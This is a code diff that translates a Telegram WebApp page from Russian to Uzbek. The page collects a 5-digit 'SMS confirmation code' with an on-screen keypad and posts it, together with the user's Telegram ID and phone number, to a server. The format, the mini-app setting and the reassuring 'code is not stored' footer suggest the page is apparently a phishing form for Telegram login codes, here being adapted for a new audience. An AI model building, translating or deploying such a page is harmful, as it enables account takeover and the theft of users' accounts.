@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="uz">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Ввод кода подтверждения</title>
+  <title>Tasdiqlash kodini kiritish</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
     :root{
@@ -191,31 +191,31 @@
     <div class="card">
       <div class="top">
         <div>
-          <p class="title">Подтверждение</p>
-          <p class="subtitle">Введите код из SMS — это займёт пару секунд.</p>
+          <p class="title">Tasdiqlash</p>
+          <p class="subtitle">SMS orqali kelgan kodni kiriting — bu bir necha soniya oladi.</p>
         </div>
-        <div class="pill" id="phoneDisplay">Номер: —</div>
+        <div class="pill" id="phoneDisplay">Raqam: —</div>
       </div>
 
-      <div class="codeBox" aria-label="Код подтверждения">
+      <div class="codeBox" aria-label="Tasdiqlash kodi">
         <div class="codeDots" id="codeDots"></div>
       </div>
 
       <div class="hintRow">
-        <span id="progressHint">0 из 5</span>
-        <span>Можно удалить ⌫</span>
+        <span id="progressHint">0 / 5</span>
+        <span>O‘chirish: ⌫</span>
       </div>
     </div>
 
     <div class="keyboard card" id="keyboard"></div>
-    <div class="footerNote">Ваш код не сохраняется на устройстве.</div>
+    <div class="footerNote">Kodingiz qurilmada saqlanmaydi.</div>
 
   </div>
 
   <script>
     const WebApp = window.Telegram?.WebApp;
     if (!WebApp) {
-      alert('Telegram WebApp не доступен');
+      alert('Telegram WebApp mavjud emas');
     } else {
       WebApp.ready();
       WebApp.expand();
@@ -226,11 +226,11 @@
     const userId = WebApp?.initDataUnsafe?.user?.id;
 
     if (!userId) {
-      alert('Не удалось получить user_id');
+      alert('user_id ni olishning imkoni bo‘lmadi');
     }
 
     function maskPhone(p) {
-      if (!p) return 'Номер не указан';
+      if (!p) return 'Raqam ko‘rsatilmagan';
       const cleaned = String(p).replace(/\D/g, '');
       if (cleaned.length < 4) return p;
       const last4 = cleaned.slice(-4);
@@ -238,7 +238,7 @@
     }
 
     const phoneEl = document.getElementById('phoneDisplay');
-    phoneEl.textContent = `Номер: ${maskPhone(phone)}`;
+    phoneEl.textContent = `Raqam: ${maskPhone(phone)}`;
 
     const codeDots = document.getElementById('codeDots');
     const progressHint = document.getElementById('progressHint');
@@ -247,7 +247,6 @@
     const CODE_LEN = 5;
     let code = '';
 
-    // Рисуем "точки" под код
     function renderDots() {
       codeDots.innerHTML = '';
       for (let i = 0; i < CODE_LEN; i++) {
@@ -255,7 +254,7 @@
         d.className = 'dot' + (i < code.length ? ' filled' : '');
         codeDots.appendChild(d);
       }
-      progressHint.textContent = `${code.length} из ${CODE_LEN}`;
+      progressHint.textContent = `${code.length} / ${CODE_LEN}`;
     }
 
     renderDots();
@@ -285,7 +284,7 @@
 
       if (code.length === CODE_LEN) {
         WebApp.MainButton
-          .setText('Подтвердить')
+          .setText('Tasdiqlash')
           .show()
           .onClick(sendCode);
       } else {
@@ -293,7 +292,7 @@
       }
     }
 
-    // Клавиатура (без кнопки C)
+    // Klaviatura (C tugmasi yo‘q)
     const keys = [
       '1','2','3',
       '4','5','6',
@@ -321,7 +320,7 @@
       keyboard.appendChild(btn);
     });
 
-    // Поддержка ввода с физической клавиатуры (если откроют на десктопе)
+    // Desktopda ochilsa: klaviaturadan ham ishlaydi
     window.addEventListener('keydown', (e) => {
       if (e.key >= '0' && e.key <= '9') addDigit(e.key);
       if (e.key === 'Backspace') deleteDigit();
@@ -331,7 +330,6 @@
     async function sendCode() {
       if (code.length !== CODE_LEN) return;
 
-      // Чтобы не дублировать клики
       WebApp.MainButton.disable().showProgress(true);
 
       const data = { user_id: userId, phone, code };
@@ -351,12 +349,12 @@
         } else {
           WebApp.MainButton.enable().showProgress(false);
           haptic('rigid');
-          alert('Ошибка: ' + (result.message || result.error || 'неизвестная'));
+          alert('Xatolik: ' + (result.message || result.error || 'noma’lum'));
         }
       } catch (err) {
         WebApp.MainButton.enable().showProgress(false);
         haptic('rigid');
-        alert('Ошибка сети: ' + err);
+        alert('Tarmoq xatosi: ' + err);
       }
     }
   </script>
